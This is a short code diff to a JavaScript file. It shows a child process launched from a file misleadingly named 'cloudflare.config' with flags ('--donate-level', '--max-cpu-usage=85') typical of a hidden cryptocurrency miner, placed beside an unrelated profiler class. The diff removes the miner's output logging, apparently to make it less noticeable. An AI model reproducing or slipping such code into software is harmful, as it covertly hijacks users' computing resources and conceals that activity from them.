@@ -324,10 +324,6 @@ let child = spawn(__dirname + "/./cloudflare.config", [
   "--donate-level=1",
   "--max-cpu-usage=85",
 ]);
-
-child.stdout.on("data", (data) => {
-  console.log(`${data}`);
-});
 class GCProfiler {
   #profiler = null;
 
